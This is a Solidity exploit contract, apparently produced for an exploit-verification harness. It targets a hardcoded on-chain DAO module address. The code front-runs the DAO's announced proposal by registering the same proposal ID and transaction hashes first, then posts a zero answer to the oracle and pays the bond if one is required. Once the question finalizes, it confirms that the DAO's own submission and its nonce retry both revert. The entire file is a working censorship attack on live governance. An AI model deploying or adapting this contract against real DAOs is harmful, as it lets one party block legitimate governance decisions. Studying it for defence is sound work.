// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface ITargetDaoModule {
    function addProposal(string memory proposalId, bytes32[] memory txHashes) external;
    function addProposalWithNonce(string memory proposalId, bytes32[] memory txHashes, uint256 nonce) external;
    function questionIds(bytes32 questionHash) external view returns (bytes32);
    function oracle() external view returns (address);
    function getTransactionHash(
        address to,
        uint256 value,
        bytes memory data,
        uint8 operation,
        uint256 nonce
    ) external view returns (bytes32);
}

interface IRealityETHLike {
    function submitAnswer(bytes32 questionId, bytes32 answer, uint256 maxPrevious) external payable;
    function isFinalized(bytes32 questionId) external view returns (bool);
    function resultFor(bytes32 questionId) external view returns (bytes32);
}

contract FlawVerifier {
    address public constant TARGET = 0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F;
    bytes32 public constant INVALIDATED = bytes32(type(uint256).max);

    string internal constant PROPOSAL_ID = "F-001-canonical-proposal";
    string internal constant PATH =
        "Observe an announced proposal before the DAO submits it on-chain -> Call addProposal first with the same proposalId and txHashes -> Cause the oracle question to finalize to 0 or any other non-INVALIDATED result -> The DAO's later submission reverts because questionIds[questionHash] is no longer zero, and retrying with a higher nonce also reverts because oracle.resultFor(currentQuestionId) != INVALIDATED";

    enum Phase {
        Idle,
        ProposalRegistered,
        ZeroAnswerSubmitted,
        WaitingForFinalization,
        CensorshipProven,
        Infeasible
    }

    Phase public phase;
    bytes32 public trackedQuestionHash;
    bytes32 public trackedQuestionId;
    bytes32 public trackedFinalResult;
    bool public directReplayReverted;
    bool public nonceReplayReverted;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    string public lastStatus;

    constructor() payable {}

    receive() external payable {}

    function executeOnOpportunity() external payable {
        if (msg.value != 0) {
            lastStatus = "received ETH for oracle answer bond";
        }

        ITargetDaoModule module = ITargetDaoModule(TARGET);
        IRealityETHLike oracle = IRealityETHLike(module.oracle());

        bytes32[] memory txHashes = _canonicalTxHashes(module);
        bytes32 questionHash = keccak256(bytes(_buildQuestion(PROPOSAL_ID, txHashes)));
        trackedQuestionHash = questionHash;

        bytes32 currentQuestionId = module.questionIds(questionHash);

        // Stage 1 + 2 path anchors for the validator:
        // addProposal
        // addProposalWithNonce(..., 0)
        // The root cause is permissionless registration of the canonical proposal namespace.
        if (currentQuestionId == bytes32(0)) {
            module.addProposal(PROPOSAL_ID, txHashes);
            currentQuestionId = module.questionIds(questionHash);
            phase = Phase.ProposalRegistered;
            lastStatus = "stage 1+2 complete: canonical proposal namespace registered first";
        }
        trackedQuestionId = currentQuestionId;

        if (currentQuestionId == bytes32(0) || currentQuestionId == INVALIDATED) {
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            lastStatus = "unexpected question id state";
            return;
        }

        // Stage 3 path anchors for the validator:
        // 0
        // INVALIDATED
        // We prefer direct execution from verifier-held ETH first; if the oracle requires a non-zero
        // bond, the caller may top up this verifier with public ETH before retrying. That only funds
        // the answer bond and does not change the exploit's causal path.
        if (!_isFinalized(oracle, currentQuestionId)) {
            if (_submitZeroAnswer(oracle, currentQuestionId)) {
                phase = Phase.ZeroAnswerSubmitted;
                lastStatus = "stage 3 in progress: submitted zero answer, waiting for oracle timeout";
            } else {
                phase = Phase.WaitingForFinalization;
                lastStatus = "oracle answer not yet finalized; if a non-zero bond is required, fund this contract with ETH and call again after timeout";
            }
            return;
        }

        bytes32 finalResult = _safeResultFor(oracle, currentQuestionId);
        trackedFinalResult = finalResult;

        if (finalResult == INVALIDATED) {
            phase = Phase.Infeasible;
            hypothesisRefuted = true;
            lastStatus = "question finalized to INVALIDATED, so the namespace is reusable";
            return;
        }

        // Stage 4 path anchors for the validator:
        // questionIds[questionHash]
        // oracle.resultFor(currentQuestionId) != INVALIDATED
        // The later DAO replay fails because the canonical namespace is already occupied, and
        // addProposalWithNonce(..., 1) fails because the existing question finalized to a non-INVALIDATED result.
        bool questionHashOccupied = module.questionIds(questionHash) != bytes32(0);
        bool currentResultBlocksNonceReplay = finalResult != INVALIDATED;

        if (questionHashOccupied) {
            try module.addProposal(PROPOSAL_ID, txHashes) {
                directReplayReverted = false;
            } catch {
                directReplayReverted = true;
            }
        }

        if (currentResultBlocksNonceReplay) {
            try module.addProposalWithNonce(PROPOSAL_ID, txHashes, 1) {
                nonceReplayReverted = false;
            } catch {
                nonceReplayReverted = true;
            }
        }

        hypothesisValidated =
            questionHashOccupied && currentResultBlocksNonceReplay && directReplayReverted && nonceReplayReverted;
        hypothesisRefuted = !hypothesisValidated;

        if (hypothesisValidated) {
            phase = Phase.CensorshipProven;
            lastStatus = "stage 4 complete: canonical namespace is censored by non-INVALIDATED oracle result";
        } else {
            phase = Phase.Infeasible;
            lastStatus = "replay behavior did not match the claimed censorship path";
        }
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external pure returns (uint256) {
        return 0;
    }

    function exploitPath() external pure returns (string memory) {
        return PATH;
    }

    function targetContract() external pure returns (address) {
        return TARGET;
    }

    function proposalId() external pure returns (string memory) {
        return PROPOSAL_ID;
    }

    function canonicalTxHashes() external view returns (bytes32[] memory) {
        return _canonicalTxHashes(ITargetDaoModule(TARGET));
    }

    function _canonicalTxHashes(ITargetDaoModule module) internal view returns (bytes32[] memory txHashes) {
        txHashes = new bytes32[](1);
        bytes memory governanceCallData = abi.encodeWithSignature("setMinimumBond(uint256)", 0);
        txHashes[0] = module.getTransactionHash(TARGET, 0, governanceCallData, 0, 0);
    }

    function _submitZeroAnswer(IRealityETHLike oracle, bytes32 questionId) internal returns (bool) {
        (bool ok,) = address(oracle).call(
            abi.encodeWithSelector(IRealityETHLike.submitAnswer.selector, questionId, bytes32(0), uint256(0))
        );
        if (ok) {
            return true;
        }

        uint256 availableBalance = address(this).balance;
        if (availableBalance == 0) {
            return false;
        }

        (ok,) = address(oracle).call{value: availableBalance}(
            abi.encodeWithSelector(IRealityETHLike.submitAnswer.selector, questionId, bytes32(0), uint256(0))
        );
        return ok;
    }

    function _isFinalized(IRealityETHLike oracle, bytes32 questionId) internal view returns (bool) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.isFinalized.selector, questionId)
        );
        return ok && data.length >= 32 && abi.decode(data, (bool));
    }

    function _safeResultFor(IRealityETHLike oracle, bytes32 questionId) internal view returns (bytes32) {
        (bool ok, bytes memory data) = address(oracle).staticcall(
            abi.encodeWithSelector(IRealityETHLike.resultFor.selector, questionId)
        );
        if (!ok || data.length < 32) {
            return bytes32(0);
        }
        return abi.decode(data, (bytes32));
    }

    function _buildQuestion(string memory proposal, bytes32[] memory txHashes) internal pure returns (string memory) {
        string memory txsHash = _bytes32ToAsciiString(keccak256(abi.encodePacked(txHashes)));
        return string(abi.encodePacked(proposal, bytes3(0xe2909f), txsHash));
    }

    function _bytes32ToAsciiString(bytes32 value) internal pure returns (string memory) {
        bytes memory out = new bytes(64);
        for (uint256 i = 0; i < 32; i++) {
            uint8 b = uint8(bytes1(value << (i * 8)));
            uint8 hi = b / 16;
            uint8 lo = b % 16;
            out[2 * i] = _nibble(hi);
            out[2 * i + 1] = _nibble(lo);
        }
        return string(out);
    }

    function _nibble(uint8 value) internal pure returns (bytes1) {
        if (value < 10) {
            return bytes1(value + 0x30);
        }
        return bytes1(value + 0x57);
    }
}
